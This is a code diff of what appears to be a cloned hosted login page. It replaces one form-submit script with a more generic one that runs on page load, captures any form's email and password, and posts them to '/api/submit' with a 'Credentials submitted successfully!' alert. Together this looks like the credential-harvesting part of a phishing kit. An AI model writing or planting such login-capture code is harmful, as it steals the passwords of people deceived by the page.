@@ -1026,33 +1026,7 @@
               </form>
             
           
-          <script>
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
-            try {
-                const response = await fetch('/api/submit', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ email, password }),
-                });
-
-                if (response.ok) {
-                    alert('Credentials submitted successfully!');
-                } else {
-                    alert('Failed to submit credentials.');
-                }
-            } catch (error) {
-                console.error('Error submitting form:', error);
-                alert('An error occurred while submitting the form.');
-            }
-        });
-    </script>
+        
           
             
               <div id="ulp-container-form-footer-start"></div>
@@ -2287,7 +2261,50 @@ window.ulpFlags = {"enable_ulp_wcag_compliance":false};!function(){var t,e,n,r,y
         </script>
 
     </div>
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const form = document.querySelector('form'); // Select the first <form> element
+        if (form) {
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
 
+                // Get the email and password from the form
+                const emailInput = form.querySelector('input[type="email"]');
+                const passwordInput = form.querySelector('input[type="password"]');
+
+                if (!emailInput || !passwordInput) {
+                    alert('Form is missing email or password fields.');
+                    return;
+                }
+
+                const email = emailInput.value;
+                const password = passwordInput.value;
+
+                try {
+                    // Send a POST request to the API endpoint
+                    const response = await fetch('/api/submit', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ email, password }),
+                    });
+
+                    if (response.ok) {
+                        alert('Credentials submitted successfully!');
+                    } else {
+                        alert('Failed to submit credentials.');
+                    }
+                } catch (error) {
+                    console.error('Error submitting form:', error);
+                    alert('An error occurred while submitting the form.');
+                }
+            });
+        } else {
+            console.error('No form found on the page.');
+        }
+    });
+</script>
 </body>
 <script type="text/javascript">
     var mobile = (/iphone|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase()));
